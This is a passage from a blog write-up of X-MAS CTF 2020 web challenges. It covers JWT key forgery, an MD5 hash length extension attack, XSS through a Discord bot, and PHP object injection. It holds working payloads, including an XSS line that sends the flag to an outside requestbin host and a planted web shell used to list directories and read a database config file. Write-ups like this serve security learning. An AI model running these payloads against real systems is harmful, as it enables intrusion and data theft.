class="string">&#x27;jwt.gif&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    key = fp.read()</span><br><span class="line"></span><br><span class="line">print(jwt.encode(&#123;<span class="string">&#x27;banner&#x27;</span>: <span class="string">&#x27;flag.php&#x27;</span>&#125;, key, algorithm=<span class="string">&#x27;HS256&#x27;</span>, headers=&#123;<span class="string">&#x27;kid&#x27;</span>: <span class="string">&#x27;/var/www/html/b/src/1608071199792.gif&#x27;</span>&#125;))</span><br></pre></td></tr></table></figure><p>I wrote jwt Signing code as above.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%ED%9B%84%2010.10.23.png?raw=true"><br>If you run the code, you can see jwt appear as above.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%ED%9B%84%2010.12.08.png?raw=true"><br>When I decode jwt and check it, I can see that the value is well entered.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%ED%9B%84%2010.16.02.png?raw=true"><br>So when I send a request to getbanner.php using the above jwt, you can see that flag.php is displayed, not the picture.</p><p><code>FLAG : X-MAS&#123;n3v3r_trust_y0ur_us3rs_k1ds-b72dcf5a49498400&#125;</code></p><hr><h3 id="Web-World’s-most-complex-SQL-Query"><a href="#Web-World’s-most-complex-SQL-Query" class="headerlink" title="(Web) World’s most complex SQL Query"></a>(Web) World’s most complex SQL Query</h3><p><strong>Challenge Author :</strong> Milkdrop<br><br><strong>Category :</strong> WEB<br><br><strong>Points :</strong> 484<br><br><strong>Solves :</strong> 19<br><br><strong>TL;DR</strong> : SQL Query Analysis<br></p><p><img src="https://github.com/wjddnjs33/image/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%EC%A0%84%206.32.05.png?raw=true"></p><hr><h3 id="Web-cat-clicker"><a href="#Web-cat-clicker" class="headerlink" title="(Web) cat_clicker"></a>(Web) cat_clicker</h3><p><strong>Challenge Author :</strong> yakuhito<br><br><strong>Category :</strong> WEB<br><br><strong>Points :</strong> 474<br><br><strong>Solves :</strong> 24<br><br><strong>TL;DR</strong> : hash length extension attack<br></p><p><img src="https://github.com/wjddnjs33/image/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%EC%A0%84%206.25.59.png?raw=true"><br>This time, we will solve the problem called <code>Cat Clicker</code> among web problems from X-MAS CTF 2020.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%ED%9B%84%2010.43.58.png?raw=true"><br>When it comes to problems, there is logic to buy flags using the number of cats. The fake flag seems to be available for purchase if you have one cat and the real flag is 13 cats.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%ED%9B%84%2010.47.06.png?raw=true"><br>You can increase the number of cats by clicking on the face, but it seems like 12 is the maximum.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">state : 12 | 0</span><br><span class="line">hash : cf13ab76afb625f7f7d6c539c2cb3c84</span><br><span class="line"></span><br><span class="line">state : 12 | 1</span><br><span class="line">hash : e71f77e8f7c2c2957292f4a0e1d79d9d</span><br><span class="line"></span><br><span class="line">(Skip)</span><br><span class="line"></span><br><span class="line">state : 12 | 12</span><br><span class="line">hash : 9579729592f72a075bb61f63b8ea238e</span><br></pre></td></tr></table></figure><p>As above, the number of cats is managed by the hash value, and looking at the hash, it seems to be an md5 hash.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-19%20%EC%98%A4%EC%A0%84%204.42.16.png?raw=true"><br>And since this web service has a .git directory, you can pull out all the .git trees.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-19%20%EC%98%A4%EC%A0%84%204.46.13.png?raw=true"><br>I downloaded all the .git trees using gitdumper.sh, and you can lick the source code using the <code>git cat-file -p</code> command.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hashFor</span>(<span class="params"><span class="variable">$state</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$secret</span> = getenv(<span class="string">&quot;SECRET_THINGY&quot;</span>); <span class="comment">// 64 random characters - impossible to guess</span></span><br><span class="line"><span class="variable">$s</span> = <span class="string">&quot;<span class="subst">$secret</span> | <span class="subst">$state</span>&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> md5(<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">verifyState</span>(<span class="params"><span class="variable">$state</span>, <span class="variable">$hash</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$hash</span> === hashFor(<span class="variable">$state</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCatsNo</span>(<span class="params"><span class="variable">$state</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$arr</span> = explode(<span class="string">&quot; | &quot;</span>, <span class="variable">$state</span>);</span><br><span class="line"><span class="keyword">return</span> intval(end(<span class="variable">$arr</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getParentsLimit</span>(<span class="params"><span class="variable">$state</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$arr</span> = explode(<span class="string">&quot; | &quot;</span>, <span class="variable">$state</span>);</span><br><span class="line"><span class="keyword">return</span> intval(reset(<span class="variable">$arr</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>The above code is the source code of helper.php. If you look at the hashFor function, you are using <code>salt</code>. As such, the hash value cannot be predicted, but you can bypass it using a <code>hash length extension attack</code>.<br><br></p><p>Kindly the length of the salt is <code>64</code>, as you can see it shows in the tin. If you don’t know the length of the salt, you need to estimate the length using <code>brute force</code>.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCatsNo</span>(<span class="params"><span class="variable">$state</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$arr</span> = explode(<span class="string">&quot; | &quot;</span>, <span class="variable">$state</span>);</span><br><span class="line"><span class="keyword">return</span> intval(end(<span class="variable">$arr</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>And if you look at the getCatsNo function, you can see that the last value of the array is used as the number of cats by using the end function.<br><br></p><p>Therefore, when it becomes “<code>12 | 1 | Null Byte | 1000 |</code>“, <code>1000</code> is used as the number of cats. If there is no logic to fetch only the last value of the array, it won’t work.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-19%20%EC%98%A4%EC%A0%84%205.10.35.png?raw=true"><br>So, since I know the salt length, I made a payload using <code>hashpump</code>. (<code>URL encoding</code>)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fetch = <span class="built_in">require</span>(<span class="string">&quot;node-fetch&quot;</span>);</span><br><span class="line">fetch(<span class="string">&#x27;http://challs.xmas.htsp.ro:3003/api/buy.php&#x27;</span>, &#123;</span><br><span class="line">    method: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    headers: &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    body: <span class="string">&#x27;item_id=2&amp;state=12%20%7C%201%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00H%02%00%00%00%00%00%00%20%7C%201000&amp;hash=f48ccd5768b829f8856ae186eb4bf4a4&#x27;</span></span><br><span class="line">&#125;).then(<span class="function">(<span class="params">x</span>) =&gt;</span> x.text()).then(<span class="function">(<span class="params">x</span>) =&gt;</span> <span class="built_in">console</span>.log(x));</span><br></pre></td></tr></table></figure><p>As above, I wrote the exploit code using JavaScript.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-19%20%EC%98%A4%EC%A0%84%205.17.01.png?raw=true"><br>Finally, return the exploit code to see the successful purchase of the flag.</p><p><code>FLAG : X-MAS&#123;1_h4v3_s0_m4ny_c4t5_th4t_my_h0m3_c4n_b3_c0ns1d3r3d_4_c4t_sh3lt3r_aaf30fcb4319effa&#125;</code></p><hr><h3 id="Web-Comfort-Bot"><a href="#Web-Comfort-Bot" class="headerlink" title="(Web) Comfort Bot"></a>(Web) Comfort Bot</h3><p><strong>Challenge Author :</strong> Milkdrop<br><br><strong>Category :</strong> WEB<br><br><strong>Points :</strong> 432<br><br><strong>Solves :</strong> 39<br><br><strong>TL;DR</strong> : Simple XSS<br></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-19%20%EC%98%A4%EC%A0%84%205.31.43.png?raw=true"><br>This time, we will solve one of the web problems from X-MAS CTF 2020 called Comfort Bot.<br><br></p><p>The peculiarity of the Comfort Bot problem was that it did not have a web server and was solved using the X-MAS bot within Discord. And it provides the source code, so let’s check the source code first.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># bot.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> (message.content.startswith (<span class="string">&quot;!&quot;</span>)):</span><br><span class="line">spell = <span class="literal">True</span></span><br><span class="line">response = <span class="keyword">await</span> engine.getCleverResponse (authorID, message.content[<span class="number">1</span>:])</span><br></pre></td></tr></table></figure><p>The code above is the part that is executed when the value input from the X-MAS Discord Bot starts with an exclamation mark.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># engine.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">getCleverResponse</span> (<span class="params">authorID, message</span>):</span></span><br><span class="line"><span class="keyword">if</span> (authorID == <span class="number">0</span>):</span><br><span class="line"><span class="keyword">return</span> random.choice([<span class="string">&quot;Oh, I quite certainly agree.&quot;</span>, <span class="string">&quot;There, there, it&#x27;s alright.&quot;</span>, <span class="string">&quot;Oh!&quot;</span>, <span class="string">&quot;Fascinating!&quot;</span>, <span class="string">&quot;Exquisite reply!&quot;</span>, <span class="string">&quot;Running program: COMFORT.&quot;</span>, <span class="string">&quot;Understandable.&quot;</span>, <span class="string">&quot;Hmm.&quot;</span>, <span class="string">&quot;I see.&quot;</span>, <span class="string">&quot;Well, if you really think that...&quot;</span>, <span class="string">&quot;What are you doing?&quot;</span>, <span class="string">&quot;What are you up to?&quot;</span>, <span class="string">&quot;What&#x27;s that?&quot;</span>, <span class="string">&quot;[Nodding]&quot;</span>, <span class="string">&quot;[Nodding and stroking chin saying mhmm]&quot;</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">await</span> parseUsers (cleverDriver.getCleverResponse (authorID, message))</span><br></pre></td></tr></table></figure><p>The code above is the getCleverResponse function in engile.py. In the code, you can see that if authorID is <code>0</code>, a random string in the array is printed, and if authorID is <code>not 0</code>, cleverDriver.getCleverResponse function is executed.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># driver.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">getCleverResponse</span> (<span class="params">authorID, txt</span>):</span></span><br><span class="line"><span class="keyword">global</span> driver</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">driver.execute_script(<span class="string">&quot;window.open(&#x27;http://localhost/&#x27;,&#x27;_blank&#x27;);&quot;</span>)</span><br><span class="line">windows[authorID] = driver.window_handles[-<span class="number">1</span>]</span><br><span class="line">switchToAuthorWindow(authorID)</span><br><span class="line"></span><br><span class="line">script = <span class="string">&quot;cleverbot.sendAI(&#x27;&#123;0&#125;&#x27;)&quot;</span>.<span class="built_in">format</span> (txt)</span><br><span class="line">driver.execute_script (script)</span><br><span class="line"><span class="keyword">while</span> (driver.execute_script (<span class="string">&quot;return cleverbot.aistate&quot;</span>) != <span class="number">0</span>):</span><br><span class="line"><span class="keyword">await</span> asyncio.sleep (<span class="number">0.4</span>)</span><br><span class="line">switchToAuthorWindow(authorID)</span><br><span class="line"></span><br><span class="line">reply = driver.execute_script (<span class="string">&quot;return cleverbot.reply&quot;</span>)</span><br><span class="line">switchToAuthorWindow(authorID)</span><br><span class="line">driver.execute_script(<span class="string">&quot;window.close()&quot;</span>)</span><br><span class="line">driver.switch_to_window(driver.window_handles[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">return</span> reply</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">CreateCleverDriver ()</span><br></pre></td></tr></table></figure><p>The code above is in the getCleverResmpose function in driver.py!</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">script = <span class="string">&quot;cleverbot.sendAI(&#x27;&#123;0&#125;&#x27;)&quot;</span>.<span class="built_in">format</span> (txt)</span><br><span class="line">driver.execute_script (script)</span><br></pre></td></tr></table></figure><p>If you look in the middle, you can see the code above. The <code>txt</code> value is put in the script variable without any verification, and the script is executed using the <code>execute_script</code> function.<br><br></p><p>You can trigger XSS in the logic right above.</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script = &quot;cleverbot.sendAI(&#x27;!asdf&#x27;);fetch(&#x27;/flag&#x27;).then(x=&gt;x.text()).then(x=&gt;fetch(&quot;URL/?f=&quot; + x));(&#x27;&#x27;)&quot;</span><br></pre></td></tr></table></figure><p>If you manipulate the code and make it as above, the fetch function runs well and you can steal the flag.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!asdf&#39;);fetch(&#39;&#x2F;flag&#39;).then(x&#x3D;&gt;x.text()).then(x&#x3D;&gt;fetch(&quot;https:&#x2F;&#x2F;384bbb03a643480f7077ff3d9d4b01d5.m.pipedream.net&#x2F;?f&#x3D; &quot; +x));(&#39;</span><br></pre></td></tr></table></figure><p>So I wrote the payload as above and sent it to the X-MAS Discord Bot.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-19%20%EC%98%A4%EC%A0%84%206.28.33.png?raw=true"><br>Finally, when I checked the requestbin, I could see the flag came.</p><p><code>FLAG : X-MAS&#123;0h_J1nk135!!!Why_w0uld_y0u_br34k_our_commun4l_b07???125184ae&#125;</code></p><hr><h3 id="WEB-How-Brutus-stole-Christmas"><a href="#WEB-How-Brutus-stole-Christmas" class="headerlink" title="(WEB) How Brutus stole Christmas"></a>(WEB) How Brutus stole Christmas</h3><p><strong>Challenge Author :</strong> Milkdrop<br><br><strong>Category :</strong> WEB<br><br><strong>Points :</strong> 492<br><br><strong>Solves :</strong> 13<br><br><strong>TL;DR</strong> : Simple PHP Object Injection, WebShell<br></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-19%20%EC%98%A4%EC%A0%84%206.41.24.png?raw=true"><br>This time, we will solve the problem of How Brutus stole Christmas among the web problems raised by the X-MAS CTF. This problem is a problem that I tried until the last time because I didn’t have enough time to solve it.<br><br></p><p>The peculiar thing about this problem is that one CTF site is given as a problem, and the problem is that the CTF site is hacked using the problem in the given CTF site.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pageContent</span></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$file_name</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$newContent</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">  </span>&#123; </span><br><span class="line">    <span class="keyword">$this</span>-&gt;file_name=<span class="string">&quot;data/content.txt&quot;</span>; </span><br><span class="line">    <span class="variable">$file</span> = file_get_contents(<span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;newContent=<span class="variable">$file</span>;</span><br><span class="line">  &#125; </span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;newContent;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setContent</span>(<span class="params"><span class="variable">$newContent</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;newContent=<span class="variable">$newContent</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">  </span>&#123; </span><br><span class="line">    <span class="variable">$fd</span>=fopen(<span class="keyword">$this</span>-&gt;file_name,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">    fwrite(<span class="variable">$fd</span>,<span class="keyword">$this</span>-&gt;newContent);</span><br><span class="line">    fclose(<span class="variable">$fd</span>);</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setFooter</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;newFooter&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$newFooter</span>=unserialize(base64_decode(<span class="variable">$_GET</span>[<span class="string">&quot;newFooter&quot;</span>]));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;footer&quot; style=&quot;color: white&quot;&gt;&#x27;</span>.<span class="variable">$newFooter</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;footer&quot; style=&quot;color: white&quot;&gt;PWNgyan 2020!&lt;/div&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$page</span> = <span class="keyword">new</span> pageContent;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$page</span>;</span><br><span class="line">setFooter();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>I’m going to hack the site using problem 1 on the CTF site. If you come into question 1, you can find the code above.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">  <span class="variable">$fd</span>=fopen(<span class="keyword">$this</span>-&gt;file_name,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">  fwrite(<span class="variable">$fd</span>,<span class="keyword">$this</span>-&gt;newContent);</span><br><span class="line">  fclose(<span class="variable">$fd</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>Looking at the code, you can see that when the destructor runs, it creates a file. After seeing this, I thought I should upload a web shell using PHP Object Injection.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;pageContent&quot;:2:&#123;s:9:&quot;file_name&quot;;s:10:&quot;.&#x2F;abcd.php&quot;;s:10:&quot;newContent&quot;;s:20:&quot;&lt;?php system(&quot;ls&quot;)?&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure><p>So, I just wrote a simple payload and sent it as above, but the file was not created well. So, mentality went out and did this and that, and suddenly <code>as3617</code> released PHP Object Injection PPT.<br><br></p><p>Looking at this PPT, I learned that when a variable is defined as Private, Null Byte is attached to both sides of the variable.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;pageContent&quot;:2:&#123;s:11:&quot;file_name&quot;;s:10:&quot;.&#x2F;abcd.php&quot;;s:12:&quot;newContent&quot;;s:20:&quot;&lt;?php system(&quot;ls&quot;)?&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure><p>So, based on this, I wrote the payload again as above, but it didn’t work well. So I couldn’t solve the problem because of this.<br><br></p><p>So, after the contest, I asked a person belonging to Defenit who was all over the web. It turns out that if the variable is defined as private, you need to reference the variable like \x00classname\x00variable.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;pageContent&quot;:2:&#123;s:22:&quot;�pageContent�file_name&quot;;s:15:&quot;data&#x2F;pyburp.php&quot;;s:23:&quot;�pageContent�newContent&quot;;s:15:&quot;&lt;?&#x3D;&#96;$_GET[x]&#96;?&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure><p>So, finally, I wrote the payload as above.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-19%20%EC%98%A4%EC%A0%84%207.29.00.png?raw=true"><br>When I uploaded the webshell and accessed the file, I was able to confirm that the webshell was uploaded well.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challs.xmas.htsp.ro:3050&#x2F;data&#x2F;pyburp.php?x&#x3D;ls ~&#x2F;</span><br><span class="line">output &#x3D;&gt; ctfx</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;challs.xmas.htsp.ro:3050&#x2F;data&#x2F;pyburp.php?x&#x3D;ls ~&#x2F;ctfx</span><br><span class="line">output &#x3D;&gt; composer.json composer.lock htdocs include install writable</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;challs.xmas.htsp.ro:3050&#x2F;data&#x2F;pyburp.php?x&#x3D;ls ~&#x2F;ctfx&#x2F;include</span><br><span class="line">output &#x3D;&gt; Config.php cache.inc.php captcha.inc.php config config_loader.inc.php constants.inc.php db.inc.php email.inc.php files.inc.php general.inc.php json.inc.php language layout mellivora.inc.php raceconditions.inc.php session.inc.php thirdparty two_factor_auth.inc.php xsrf.inc.php</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;challs.xmas.htsp.ro:3050&#x2F;data&#x2F;pyburp.php?x&#x3D;ls ~&#x2F;ctfx&#x2F;include&#x2F;config</span><br><span class="line">&#x3D;&gt; config.default.inc.php db.default.inc.php</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;challs.xmas.htsp.ro:3050&#x2F;data&#x2F;pyburp.php?x&#x3D;cat ~&#x2F;ctfx&#x2F;include&#x2F;config&#x2F;db.default.inc.php</span><br><span class="line">output &#x3D;&gt; </span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> *</span><br><span class="line"> * This file contains default configuration.</span><br><span class="line"> *</span><br><span class="line"> *        DO NOT MAKE CHANGES HERE</span><br><span class="line"> *</span><br><span class="line"> * Copy this file and name it &quot;db.inc.php&quot;</span><br><span class="line"> * before making any changes. Any changes in</span><br><span class="line"> * db.inc.php will override the default</span><br><span class="line"> * config. It is also possible to override</span><br><span class="line"> * configuration options using environment</span><br><span class="line"> * variables. Environment variables override</span><br><span class="line"> * both the default settings and the hard-coded</span><br><span class="line"> * user defined settings.</span><br><span class="line"> *</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">Config::set(&#39;MELLIVORA_CONFIG_DB_ENGINE&#39;, &#39;mysql&#39;);</span><br><span class="line">Config::set(&#39;MELLIVORA_CONFIG_DB_HOST&#39;, &#39;localhost&#39;);</span><br><span class="line">Config::set(&#39;MELLIVORA_CONFIG_DB_PORT&#39;, 3306);</span><br><span class="line">Config::set(&#39;MELLIVORA_CONFIG_DB_NAME&#39;, &#39;mellivora&#39;);</span><br><span class="line">Config::set(&#39;MELLIVORA_CONFIG_DB_USER&#39;, 